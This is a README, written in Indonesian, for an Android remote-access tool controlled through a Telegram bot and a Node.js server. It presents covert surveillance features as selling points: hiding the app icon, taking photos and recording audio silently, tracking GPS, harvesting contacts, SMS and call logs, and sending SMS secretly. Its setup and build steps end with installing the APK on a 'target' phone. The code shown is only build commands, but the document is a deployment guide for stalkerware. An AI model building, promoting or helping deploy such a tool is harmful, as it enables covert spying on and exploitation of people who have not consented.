# 🤖 RAC-JS (Remote Access Control - JS)

Sebuah sistem *Command and Control* (C2) cerdas dan tersembunyi untuk perangkat Android yang dioperasikan sepenuhnya melalui Bot Telegram. Dibangun menggunakan perpaduan teknologi *Client-Server* modern (Node.js & Kotlin).

## ✨ Fitur Utama
* **Stealth Mode (Anti-Terdeteksi)**: Kemampuan menyembunyikan ikon aplikasi target dari *App Drawer* Android pengguna (Membutuhkan akses memori di beberapa versi Android lawas).
* **Multimedia Spionase**:
  * Mengambil foto diam-diam (Kamera depan & belakang) tanpa suara rana.
  * Merekam aktivitas mikrofon (*Audio Recording*) di sekitar perangkat secara mulus di latar belakang.
* **Smart Dashboard & Peta Lokasi**: Lacak riwayat lokasi GPS secara *real-time* dan putar berbagai *output* multimedia target melalui **Web Admin Dashboard** interaktif yang dirancang dengan estetika TailwindCSS dan Alpine.js.
* **Manajemen Perangkat Terpadu**:
  * Akses lengkap ke Kontak (Contacts) dan SMS Inbox.
  * *Remote Sender*: Kirim SMS secara diam-diam ke pihak ketiga.
  * Tarik Riwayat Panggilan Telepon (*Call Logs*).
  * Ekstrak daftar serta total keseluruhan Aplikasi yang terpasang.
* **Aksi Prank / Penanda Target**: Getarkan perangkat sesuka hati, paksakan (*Force Open*) layar web, ubah *Wallpaper* dengan gambar URL apapun, atau bunyikan *Alarm Darurat* dengan batas toleransi audio dimaksimalkan!
* **Optimasi 'Smart Long-Polling'**: RAC-JS dirancang untuk benar-benar hemat daya. Aplikasi Android tidak akan memboroskan baterai (tanpa pengurasan koneksi Wi-Fi/Seluler aktif), tetapi akan mendengarkan perintah dalam mode `Long-Polling` interaktif yang merespons dalam sekejap begitu tombol ditekan.
* **Database Cerdas (Anti-Bloatware)**: Server tidak menyimpan *Base64 string* besar di sistem SQLite, file diekstrak langsung ke format statik (`.mp4` / `.jpg`), mempertahankan kecepatan ekstrem pada dasbor Web.

---

## 🏗️ Struktur Arsitektur
Aplikasi ini secara teknis dipecah ke dalam dua instrumen utama:
1. **Node.js Endpoint (Server & Admin Dashboard)**: Berperan sebagai jembatan cerdas (*proxy*) yang menghubungkan input kendali Telegram Anda, mentransfernya ke Server API, lalu mendorongnya menuju perangkat *handphone*.
2. **Klien Android (Kotlin/Foreground Service)**: Aplikasi target berukuran super-ringan yang didesain secara spesifik untuk mematuhi larangan aplikasi sistem Android modern (menembus *Doze Mode* dan *Background Execution Limits*) sehingga siap sedia menuruti respon meski ponsel pintar sedari lama tengah tertidur.

> 📚 Dokumentasi teknis mengenai diagram logika (Flowchart) dan integrasi antarmuka bisa Anda baca secara mandiri pada folder [**`/docs/`**](./docs/) yang ada di repositori ini.

---

## 🛠️ Panduan Instalasi (*Quick Start*)

### 1. Menjalankan Server & Bot (Backend Node.js)
Pastikan port komputasi `3000` Anda tersedia tanpa *traffic* aplikasi lain.
```bash
# Masuk ke folder backend server
cd server

# Install dependensi pustaka JavaScript yang difokuskan
npm install

# Salin konfigurasi environment
cp .env.example .env
```
👉 **WAJIB:** Buka/Edit file `.env` di atas dan lengkapi konfigurasi variabel Telegram Bot API Token yang Anda terima dari `@BotFather`.

```bash
# Jalankan Server (Mode Produksi/Testing)!
npm start
```

### 2. Memeriksa Web Admin 
Setelah *bot* menyala tanpa _error_, kunjungilah antarmuka administrator RAC-JS Anda ke:
`http://localhost:3000/admin` *(Kata sandi untuk *login* bisa ditemukan/dimodifikasi dari dalam file .env)*.

---

## 📱 Build Aplikasi Klien Android (APK)

Kami menyajikan dua opsi kemudahan agar klien aplikasi dapat dikompilasi secara otomatis tanpa memberatkan perangkat keras laptop Anda!

### Opsi A: Menggunakan GitHub Actions Auto-Build (Paling Disarankan)
Repositori ini telah dikonfigurasi menggunakan YAML `Android CI/CD`. Sistem akan otomatis membuat file siap install *(APK)* setiap kali Anda melakukan perilisan *Tag*.

1. Hubungkan / *Push* komit GitHub terbaru Anda.
2. Buat rilis Git **Tag** baru di terminal Anda (contoh: `git tag v1.0.0` diikuti `git push origin v1.0.0`).
3. Tunggu 1 menit. Masuk ke tab/panel **Releases** di Dashboard GitHub utama Anda, lalu segera unuk `app-debug.apk` atau `app-release-unsigned.apk` yang otomatis didistribusikan dari komputasi awan!

### Opsi B: Build Manual dari Terminal / Android Studio
Jika Anda enggan meneruskan CI/CD dan ingin mengujinya secara instan pada _emulator_ lokal / fisik Anda:

```bash
# Kembali ke Root Folder 
cd rac-js

# Beri izin aplikasi antarmuka Terminal Gradle!
chmod +x gradlew

# Kompile aplikasi Debug tanpa Keystore
./gradlew assembleDebug

# Output APK Anda kini siap dicabut dari: 
# app/build/outputs/apk/debug/app-debug.apk
```

Instal .apk tersebut langsung ke *smartphone* target. Izinkan berbagai akses kritikalnya pada sesi awal pembukaan aplikasi agar sistem RAC bisa bekerja menyeluruh!

---
🌟 **Remote Access Control JS** — Dibangun untuk fleksibilitas eksplorasi pengembangan!
